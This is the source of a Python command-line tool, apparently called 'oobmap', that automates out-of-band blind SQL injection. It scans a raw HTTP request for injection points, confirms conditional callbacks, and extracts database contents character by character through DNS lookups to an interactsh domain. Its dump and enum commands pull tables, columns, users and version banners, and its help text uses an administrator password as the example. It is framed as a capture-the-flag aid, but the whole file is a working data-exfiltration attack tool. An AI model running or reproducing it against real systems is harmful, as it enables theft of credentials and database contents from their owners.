import argparse
import copy
import string
import sys
import uuid

from . import __version__
from .oob import InteractshLog
from .payloads import PROFILES
from .requester import current_value, inject, injection_points, parse_raw_request, send


DEFAULT_ALPHABET = string.ascii_lowercase + string.digits
ENUM_ALPHABET = string.ascii_letters + string.digits + " _-.:/@()[]{}+,;=<>|"


def normalize_domain(domain: str) -> str:
    domain = domain.strip()
    domain = domain.removeprefix("http://").removeprefix("https://")
    return domain.strip("/.")


def token_for(run_id: str, pos: int, char: str) -> str:
    return f"{run_id}-p{pos:02d}-c{ord(char):02x}"


def build_expression(args) -> str:
    if getattr(args, "expr", None):
        return args.expr

    column = getattr(args, "column", None)
    table = getattr(args, "table", None)
    where = getattr(args, "where", None)
    if not (column and table):
        raise SystemExit("dump requires -T/--table and -C/--column")

    if args.dbms == "mssql":
        expr = f"SELECT TOP 1 {column} FROM {table}"
    else:
        expr = f"SELECT {column} FROM {table}"

    if where:
        expr += f" WHERE {where}"
    if args.dbms != "mssql":
        expr += " LIMIT 1"
    return expr


ENUM_EXPRESSIONS = {
    "sqlite-lab": {
        "banner": "SELECT sqlite_version()",
        "current_user": "SELECT 'sqlite'",
        "current_db": "SELECT 'main'",
    },
    "mssql": {
        "banner": "SELECT @@version",
        "current_user": "SELECT SYSTEM_USER",
        "current_db": "SELECT DB_NAME()",
    },
    "mysql": {
        "banner": "SELECT @@version",
        "current_user": "SELECT USER()",
        "current_db": "SELECT DATABASE()",
    },
    "oracle-http": {
        "banner": "SELECT banner FROM v$version WHERE rownum=1",
        "current_user": "SELECT USER FROM dual",
        "current_db": "SELECT ora_database_name FROM dual",
    },
    "postgres-program": {
        "banner": "SELECT version()",
        "current_user": "SELECT current_user",
        "current_db": "SELECT current_database()",
    },
}


def load_common(args):
    profile = PROFILES[args.dbms]
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = InteractshLog(args.log)
    run_id = args.run_id or uuid.uuid4().hex[:6]
    if args.base is None:
        args.base = current_value(request, args.param, args.place)
    return profile, request, domain, log, run_id


def send_payload(args, request, payload):
    injected = inject(request, args.param, payload, args.place)
    try:
        status, body = send(injected, force_ssl=args.force_ssl, timeout=args.http_timeout)
        if args.verbose:
            print(f"[http] {status} {len(body)} bytes")
    except Exception as exc:
        if args.verbose:
            print(f"[http] ignored error: {exc}")


def run_check(args, profile, request, domain, log, run_id) -> int:
    print(f"[+] profile: {profile.name}")
    print(f"[+] {profile.comment}")
    print(f"[+] run id: {run_id}")
    print(f"[+] watching: {args.log}")
    print(f"[+] target: {args.place}:{args.param}")

    true_token = f"{run_id}-true"
    false_token = f"{run_id}-false"
    true_payload = profile.payload(args.base, args.true_condition, f"{true_token}.{domain}")
    false_payload = profile.payload(args.base, args.false_condition, f"{false_token}.{domain}")

    print("[+] sending true probe")
    send_payload(args, request, true_payload)
    true_hit = log.wait_any({true_token: "true"}, args.timeout)

    print("[+] sending false probe")
    send_payload(args, request, false_payload)
    false_hit = log.wait_any({false_token: "false"}, args.timeout)

    if true_hit and not false_hit:
        print("[+] OOB condition confirmed")
        return 0
    if true_hit and false_hit:
        print("[!] both true and false probes triggered callbacks")
        print("[!] payload is OOB-capable but not conditionally controlled")
        return 2
    print("[!] no reliable conditional OOB behavior detected")
    return 1


def check(args) -> int:
    if args.param:
        profile, request, domain, log, run_id = load_common(args)
        return run_check(args, profile, request, domain, log, run_id)

    profile = PROFILES[args.dbms]
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = InteractshLog(args.log)
    points = injection_points(request, args.level)
    if not points:
        print("[!] no injection points found at this level")
        return 1

    print(f"[+] scanning {len(points)} injection point(s) with level={args.level}, risk={args.risk}")
    found = False
    for point in points:
        candidate_args = copy.copy(args)
        candidate_args.param = point.name
        candidate_args.place = point.place
        candidate_args.base = point.value
        run_id = f"{args.run_id or uuid.uuid4().hex[:6]}-{point.place[:1]}{abs(hash((point.place, point.name))) % 10000}"
        print()
        rc = run_check(candidate_args, profile, request, domain, log, run_id)
        if rc == 0:
            print(f"[+] injectable OOB point: --place {point.place} -p {point.name}")
            found = True
            if args.first:
                break

    return 0 if found else 1


def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
    profile, request, domain, log, run_id = load_common(args)
    result = ""

    print(f"[+] profile: {profile.name}")
    print(f"[+] {profile.comment}")
    print(f"[+] run id: {run_id}")
    print(f"[+] expression: {expression}")
    print(f"[+] domain: {domain}")
    print(f"[+] watching: {args.log}")

    for pos in range(1, max_len + 1):
        token_map: dict[str, str] = {}

        for char in alphabet:
            token = token_for(run_id, pos, char)
            token_map[token] = char
            condition = profile.condition(expression, pos, char)
            payload = profile.payload(args.base, condition, f"{token}.{domain}")
            send_payload(args, request, payload)

        token = log.wait_any(token_map, args.timeout)
        if not token:
            print(f"[+] done: {result}")
            return result

        char = token_map[token]
        result += char
        print(f"[+] pos {pos:02d}: {char} -> {result}", flush=True)

    print(f"[!] reached max length: {result}")
    return result


def extract(args) -> int:
    require_param(args)
    expression = build_expression(args)
    extract_value(args, expression, args.alphabet, args.max_len)
    return 0


def enum(args) -> int:
    require_param(args)
    selected = []
    for option, key in (
        (args.banner, "banner"),
        (args.current_user, "current_user"),
        (args.current_db, "current_db"),
    ):
        if option:
            selected.append(key)
    if not selected:
        raise SystemExit("enum requires at least one of --banner, --current-user, --current-db")

    expressions = ENUM_EXPRESSIONS.get(args.dbms, {})
    for key in selected:
        expr = expressions.get(key)
        if not expr:
            print(f"[!] {key} is not implemented for {args.dbms}")
            continue
        print(f"\n[+] enum {key}: {expr}")
        value = extract_value(args, expr, args.alphabet, args.max_len)
        print(f"[+] {key}: {value}")
    return 0


def require_param(args):
    if not args.param:
        raise SystemExit("this command requires -p/--param. Use `oobmap check` without -p to discover injectable OOB points.")


def add_common(parser):
    parser.add_argument("-r", "--request", required=True, help="raw HTTP request file")
    parser.add_argument("-p", "--param", help="parameter/cookie/header name to inject")
    parser.add_argument(
        "--place",
        choices=["auto", "cookie", "query", "body", "header", "marker"],
        default="auto",
        help="where to inject, or marker to replace the first '*'",
    )
    parser.add_argument(
        "--dbms",
        choices=sorted(PROFILES),
        required=True,
        help="OOB payload profile",
    )
    parser.add_argument("--domain", required=True, help="interactsh domain")
    parser.add_argument("--log", required=True, help="interactsh JSONL log path")
    parser.add_argument("--base", help="base/original value before the payload; defaults to the current target value")
    parser.add_argument("--force-ssl", action="store_true", help="send request over HTTPS")
    parser.add_argument("--http-timeout", type=float, default=10.0)
    parser.add_argument("--timeout", type=float, default=8.0, help="callback wait time per probe/position")
    parser.add_argument("--run-id", help="fixed run id for reproducible debugging")
    parser.add_argument("--level", type=int, choices=range(1, 6), default=1, help="scan depth for check without -p: 1=query/body, 2=cookies, 3=common headers, 5=all headers")
    parser.add_argument("--risk", type=int, choices=(1, 2, 3), default=1, help="accepted for sqlmap-like workflow; payload selection is profile-driven for now")
    parser.add_argument("--batch", action="store_true", help="accepted for sqlmap-like non-interactive workflows")
    parser.add_argument("-v", "--verbose", action="store_true")


def make_parser():
    parser = argparse.ArgumentParser(
        prog="oobmap",
        description="CTF-first OOB blind injection extractor powered by interactsh logs",
    )
    parser.add_argument("--version", action="version", version=f"oobmap {__version__}")
    sub = parser.add_subparsers(dest="command", required=True)

    p_check = sub.add_parser("check", help="confirm conditional OOB behavior")
    add_common(p_check)
    p_check.add_argument("--true-condition", default="1=1")
    p_check.add_argument("--false-condition", default="1=2")
    p_check.add_argument("--first", action="store_true", help="stop after the first confirmed OOB point")
    p_check.set_defaults(func=check)

    p_extract = sub.add_parser("extract", help="extract a scalar SQL expression")
    add_common(p_extract)
    p_extract.add_argument("--expr", required=True, help="scalar SQL expression, e.g. SELECT password FROM users WHERE username='administrator'")
    p_extract.add_argument("--alphabet", default=DEFAULT_ALPHABET)
    p_extract.add_argument("--max-len", type=int, default=40)
    p_extract.set_defaults(func=extract)

    p_dump = sub.add_parser("dump", help="convenience wrapper around extract")
    add_common(p_dump)
    p_dump.add_argument("-T", "--table", required=True)
    p_dump.add_argument("-C", "--column", required=True)
    p_dump.add_argument("--where")
    p_dump.add_argument("--alphabet", default=DEFAULT_ALPHABET)
    p_dump.add_argument("--max-len", type=int, default=40)
    p_dump.set_defaults(func=extract)

    p_enum = sub.add_parser("enum", help="extract common DBMS metadata over OOB")
    add_common(p_enum)
    p_enum.add_argument("--banner", action="store_true")
    p_enum.add_argument("--current-user", action="store_true")
    p_enum.add_argument("--current-db", action="store_true")
    p_enum.add_argument("--alphabet", default=ENUM_ALPHABET)
    p_enum.add_argument("--max-len", type=int, default=120)
    p_enum.set_defaults(func=enum)

    p_profiles = sub.add_parser("profiles", help="list payload profiles")
    p_profiles.set_defaults(func=profiles)
    return parser


def profiles(args) -> int:
    for name in sorted(PROFILES):
        profile = PROFILES[name]
        print(f"{name:16} {profile.description}")
        print(f"{'':16} {profile.comment}")
    return 0


def main(argv=None):
    parser = make_parser()
    args = parser.parse_args(argv)
    try:
        return args.func(args)
    except KeyboardInterrupt:
        print("\n[!] interrupted", file=sys.stderr)
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
